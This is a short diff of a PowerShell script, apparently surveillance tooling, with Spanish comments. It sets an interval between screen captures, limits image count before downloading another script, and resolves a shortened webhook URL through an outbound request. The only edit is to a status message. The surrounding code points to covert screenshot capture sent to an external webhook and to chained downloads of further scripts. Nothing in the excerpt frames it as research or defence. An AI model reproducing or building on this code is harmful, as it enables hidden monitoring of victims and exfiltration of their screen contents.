@@ -3,7 +3,7 @@ $seconds = 30 # Intervalo entre capturas
 $maxImages = 1 # Cantidad máxima de imágenes antes de descargar el otro script
 
 # Detección de URL acortada
-if ($hookurl.Length -ne 121){Write-Host "Shortened Webhook URL Detected..." ; $hookurl = (irm $hookurl).url}
+if ($hookurl.Length -ne 121){Write-Host "Shortened Webhook URL Detected!!!..." ; $hookurl = (irm $hookurl).url}
 
 # Obtener la ruta del directorio donde se encuentra este script
 $scriptDirectory = Split-Path -Parent $MyInvocation.MyCommand.Definition
